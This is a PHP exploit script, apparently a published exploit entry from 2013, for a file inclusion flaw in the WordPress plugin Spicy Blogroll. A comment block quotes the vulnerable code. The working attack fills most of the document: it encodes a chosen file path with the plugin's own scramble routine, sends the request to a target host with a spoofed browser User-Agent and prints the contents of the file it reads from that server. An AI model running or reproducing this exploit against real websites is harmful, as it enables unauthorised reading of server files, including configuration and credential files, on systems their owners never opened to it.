&lt;?php 
// Title: Wordpress Plugin Spicy Blogroll File Inclusion Vulnerability
// Date: 12-07-2013 (GMT+8 Kuala Lumpur)
// Author: Ahlspiess
// Greetz: All TBDIAN - http://w3.tbd.my :)
// Screenshot: http://i.imgur.com/jIrUznC.png
/**
Details:
    File: /wp-content/plugins/spicy-blogroll-ajax.php
    SVN Source: http://svn.wp-plugins.org/spicy-blogroll/trunk/spicy-blogroll-ajax.php
&lt;?php
...
...
    $link_url = $_GET[&#039;link_url&#039;];
    $link_text = $_GET[&#039;link_text&#039;];
    $var2 = unscramble($_GET[&#039;var2&#039;]);
    $var3 = unscramble($_GET[&#039;var3&#039;]);
    $var4 = unscramble($_GET[&#039;var4&#039;]);
    $var5 = unscramble($_GET[&#039;var5&#039;]);
    $nonce = unscramble($_GET[&#039;var11&#039;]);
    require_once($var2.$var4); &lt;-- Boom
...
...
*/
 
if(!isset($argv[3])) {
    die(sprintf(&quot;php %s &lt;host&gt; &lt;path&gt; &lt;file&gt;\n&quot;, $argv[0]));
}
 
list(,$host, $path, $file) = $argv;
$vfile = &#039;http://%s%s/wp-content/plugins/spicy-blogroll/spicy-blogroll-ajax.php?var2=%s&amp;var4=%s&#039;;
$request = sprintf($vfile, $host, $path, scramble(dirname($file) . &quot;/&quot;), scramble(basename($file)));
$opts = array(
    &#039;http&#039;=&gt;array(
        &#039;header&#039;        =&gt;   &quot;User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0&quot;,
        &#039;ignore_errors&#039; =&gt;   true,
    )
);
 
$context = stream_context_create($opts);
echo file_get_contents($request, 0, $context);
 
/**
    Source: http://svn.wp-plugins.org/spicy-blogroll/trunk/spicy-blogroll.php
    Line: 386-401
*/
function scramble($text1,$rng = 1){
    $len=strlen($text1);
    $rn=$rng%2;
    $count=7;
    $seed=($rn%=2)+1;
    $text2=chr($seed+64+$rng).chr($rng+70);
    for($i=0; $i&lt;=$len-1; $i++) {
        $seed*=-1;
        $count+=1;
        $ch=ord(substr($text1,$i,1))+$seed;
        if($ch==92){$ch.=42;}
        $text2.=chr($ch);
    if($count%5==$rn){$text2.=chr(mt_rand(97,123));}
    }
    return $text2;
}
 
?&gt;
